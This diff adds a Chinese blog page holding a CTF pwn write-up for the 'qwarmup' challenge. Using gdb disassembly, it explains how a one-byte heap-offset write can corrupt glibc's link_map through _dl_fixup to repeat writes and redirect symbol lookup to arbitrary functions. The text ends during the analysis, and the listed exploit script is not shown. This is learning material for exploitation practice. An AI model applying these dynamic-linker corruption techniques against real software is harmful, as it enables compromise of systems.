@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Qwarmup - cnitlrtの博客</title><meta name="Description" content="cnitlrtの博客"><meta property="og:title" content="Qwarmup" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cnitlrt.github.io/qwarmup/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-04T22:20:17+08:00" />
+<meta property="article:modified_time" content="2023-07-05T00:43:01+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
+
+<meta name="twitter:title" content="Qwarmup"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cnitlrt.github.io/qwarmup/" /><link rel="prev" href="https://cnitlrt.github.io/gooexec%E5%A4%8D%E7%8E%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Qwarmup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cnitlrt.github.io\/qwarmup\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "pwn","wordcount":  1989 ,
+        "url": "https:\/\/cnitlrt.github.io\/qwarmup\/","datePublished": "2023-07-04T22:20:17+08:00","dateModified": "2023-07-05T00:43:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/cnitlrt.github.io\/images\/avatar.jpg",
+                    "width":  1080 ,
+                    "height":  1080 
+                }},"author": {
+                "@type": "Person",
+                "name": "cnitlrt"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><a class="menu-item" href="/friend/"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a class="menu-item" href="/friend/" title="">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Qwarmup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pwn/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>pwn</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1989 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#qwarmup复现">qwarmup复现</a>
+      <ul>
+        <li><a href="#漏洞点">漏洞点</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#分析">分析</a></li>
+            <li><a href="#修改rel_addr控制写入位置">修改rel_addr控制写入位置</a></li>
+            <li><a href="#构造任意函数调用">构造任意函数调用</a></li>
+            <li><a href="#泄露libc--orw">泄露libc &amp;&amp; orw</a></li>
+          </ul>
+        </li>
+        <li><a href="#exp">exp</a>
+          <ul>
+            <li><a href="#house-of-apple-板子">house of apple 板子</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="qwarmup复现">qwarmup复现</h1>
+<h2 id="漏洞点">漏洞点</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705002954437.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705002954437.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705002954437.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705002954437.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705002954437.png"
+        title="image-20230705002954437" /></p>
+<p>可以进行申请堆块的偏移的任意一字节写。当size为0的时候可以已知调用</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png"
+        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704222135485.png" /></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="分析">分析</h3>
+<p>写入完就进行了write函数的调用，由于是第一次调用因此会进入dl_fixup,分析一下dl_fixup</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7fadf69069f0</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">endbr64</span> 
+</span></span><span class="line"><span class="cl">   <span class="mh">0x7fadf69069f4</span> <span class="p">&lt;</span><span class="no">_dl_fixup</span><span class="p">+</span><span class="mi">4</span><span class="p">&gt;:</span>	<span class="no">push</span>   <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf69069f5</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">5</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r10</span><span class="p">,</span><span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf69069f8</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="no">esi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf69069fa</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">10</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rsi</span><span class="err">+</span><span class="no">rsi</span><span class="p">*</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf69069fe</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a02</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x68</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a06</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a0a</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r10</span><span class="err">+</span><span class="mi">0xf8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a11</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a15</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">37</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">r8</span><span class="p">,[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a19</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r10</span><span class="err">+</span><span class="mi">0x70</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a1d</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">45</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r8</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a21</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a24</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a28</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">rsi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a2b</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">shr</span>    <span class="no">rcx</span><span class="p">,</span><span class="mi">0x20</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a2f</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">63</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rcx</span><span class="err">+</span><span class="no">rcx</span><span class="p">*</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a33</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a37</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x7fadf6906a3a</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a3f</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a42</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x7</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7fadf6906a45</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x7fadf6906b80</span> <span class="p">&lt;</span><span class="no">_dl_fixup</span><span class="p">+</span><span class="mi">400</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>add rbx,rax是写入的位置，假设我们可以控制rbx或者rax那么我们就可以控制write地址写入的位置。</p>
+<p>可以看一下rbx的赋值过程</p>
+<p><code>mov    rbx,QWORD PTR [r8]</code>=&gt;<code>lea    r8,[rax+rdx*8]</code>=&gt;<code>mov    rax,QWORD PTR [rax+0x8]</code>=&gt;<code>mov    rax,QWORD PTR [r10+0xf8]</code></p>
+<p>所以我们如果想控制rbx，那么就需要控制<code>r10 + 0xf8</code>的地方这样rbx =[[[r10 + 0xf8] + 0x8]],只能说不太好控制，但是也不是不可控制，然后再看rax</p>
+<p><code>mov    rax,QWORD PTR [r10]</code>,可以看到就是将r10里面的值给rax进行赋值。而r10就是我们的<code>struct link_map *l</code>,此值在libc里面，因此我们可以申请一个大的堆块，此时就会通过mmap来申请一块内存，这块内存紧挨着libc,这样就可以通过我们的任意地址写将该值里面的值进行覆盖，可以写入的东西在相对于got的0~0xff的位置处，因此可以通过错位的方法将size覆盖为0，从而无限制的调用任意地址写</p>
+<h3 id="修改rel_addr控制写入位置">修改rel_addr控制写入位置</h3>
+<p>首先我们需要得出我们申请的地址,建议关闭aslr来调试</p>
+<p>0x7ffff7cbd010</p>
+<p>然后得出l的地址</p>
+<p>0x7ffff7ffe220</p>
+<p>两者之间的差值0x341210</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224713556.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224713556.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224713556.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224713556.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224713556.png"
+        title="image-20230704224713556" /></p>
+<p>可以看到成果写为了0x70,后续成果将该值写为了write函数的真实地址</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224829600.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224829600.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224829600.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224829600.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224829600.png"
+        title="image-20230704224829600" /></p>
+<p>在后续赋值校验的时候发现成功进行了多次写入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224955714.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224955714.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224955714.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224955714.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704224955714.png"
+        title="image-20230704224955714" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704225007386.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704225007386.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704225007386.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704225007386.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230704225007386.png"
+        title="image-20230704225007386" /></p>
+<h3 id="构造任意函数调用">构造任意函数调用</h3>
+<p>我们再次观察_dl_fixup，通过调用<code>_dl_lookup_symbol_x</code>来获取write函数的真实地址，而其函数的第一个参数时对应的函数名称，如果我们可以控制函数名称那么我们就可以调用任意函数，这里就有两个思路</p>
+<ol>
+<li>直接修改rdi里面的字符串的值，但是我们只能写入一个字节因此就不行</li>
+<li>控制该地址</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7ffff7fdaaaf</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">191</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rdx</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaab1</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">193</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">r11</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaab6</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">198</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">r9d</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaabc</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">204</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span> <span class="no">r10</span>
+</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="err">0</span><span class="nf">x7ffff7fdaabf</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">207</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">r10</span> <span class="err">+</span> <span class="mi">0x398</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaac6</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">214</span><span class="err">&gt;</span>    <span class="no">push</span>   <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaac8</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">216</span><span class="err">&gt;</span>    <span class="no">push</span>   <span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaac9</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">217</span><span class="err">&gt;</span>    <span class="no">add</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaacc</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">220</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">r11</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x7ffff7fdaacf</span> <span class="err">&lt;</span><span class="no">_dl_fixup</span><span class="err">+</span><span class="mi">223</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">_dl_lookup_symbol_x</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还是看一些rdi是怎么被赋值的</p>
+<p><code>add    rdi, rdx</code></p>
+<p>rdx倒叙=&gt;<code>mov    edx, dword ptr [rdx]</code>=&gt;<code>lea    rdx, [rax + rdx*8]</code>=&gt;<code>lea    rdx, [rcx + rcx*2]</code>=&gt;<code>mov    rax, qword ptr [rax + 8]</code>=&gt;<code>mov    rax, qword ptr [r10 + 0x70]</code></p>
+<p>rdi正序=&gt;<code>mov    rax, qword ptr [rdi + 0x68]</code>=&gt;<code>mov    rdi, qword ptr [rax + 8]</code></p>
